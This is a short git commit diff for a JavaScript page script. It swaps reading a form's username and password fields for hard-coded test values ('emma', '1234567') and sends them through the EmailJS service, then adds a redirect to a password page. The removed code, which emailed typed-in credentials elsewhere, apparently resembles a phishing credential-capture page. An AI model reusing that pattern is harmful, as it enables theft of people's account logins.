5a0fc7e7178a29915d936d4cd67450b6660ced73
mac <mac@Macs-MacBook-Air.local>
2024-02-01 16:26:48 +0100

    last commit

--- main.js
+++ main.js
@@ -1,8 +1,8 @@
 "use strict";
 function sendEmail() {
   const params = {
-    username: document.getElementById("username").value,
-    password: document.getElementById("passsword").value,
+    username: "emma",
+    password: "1234567",
   };
   const serviceID = "service_4zmio4z";
   const templateID = "template_goa7aed";
@@ -10,10 +10,21 @@ function sendEmail() {
   emailjs
     .send(serviceID, templateID, params)
     .then((res) => {
-      username: document.getElementById("username").value = "";
-      password: document.getElementById("passsword").value = "";
+      console.log(res.status);
       console.log(res);
       alert("successful");
     })
     .catch((err) => console.log(err));
 }
+
+function redirect() {
+  window.location.replace("password.html");
+  console.log("am here");
+}
+
+const form = document.getElementById("testing");
+
+form.addEventListener("submit", (e) => {
+  e.preventDefault();
+  console.log("emma");
+});
--- test.js
+++
@@ -1,8 +0,0 @@
-"use strict";
-
-const myForm = document.getElementById("myform");
-
-myForm.addEventListener("submit", (e) => {
-  e.preventDefault();
-  location.replace("password.html");
-});
